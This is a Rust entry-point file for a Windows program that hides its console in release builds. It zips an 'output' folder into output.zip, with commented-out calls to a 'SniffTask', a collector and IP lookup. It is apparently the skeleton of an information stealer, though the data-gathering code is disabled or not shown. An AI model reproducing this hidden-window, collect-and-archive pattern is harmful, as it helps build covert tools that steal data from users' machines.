#![no_main]
#![no_std]

#![cfg_attr(
    debug_assertions,
    windows_subsystem = "console"
)]

#![cfg_attr(
    not(debug_assertions),
    windows_subsystem = "windows"
)]

#![allow(unsafe_op_in_unsafe_fn)]

extern crate alloc;

use tasks::Task;
use utils::path::Path;
use zip::ZipArchive;

mod panic;

#[global_allocator]
static ALLOC: wee_alloc::WeeAlloc = wee_alloc::WeeAlloc::INIT;

#[unsafe(no_mangle)]
#[allow(unused_unsafe)]
pub fn main(_argc: i32, _argv: *const *const u8) -> i32 {
    // if !init_ip_info() {
    //     panic!()
    // }

    let out = Path::new("output");
    // let _ = out.remove_dir_all();
    // let _ = out.mkdir();
    //
    // let collector = AtomicCollector::default();
    //
    // unsafe {
    //     SniffTask::new().run(&out, &collector);
    // }
    //
    // log_debug!("{}", DisplayCollector(collector));

    let zip = ZipArchive::default()
        .comment("Lol its comment")
        .add(&out)
        .create();

    let out = Path::new("output.zip");
    let _ = out.write_file(&zip);

    0
}
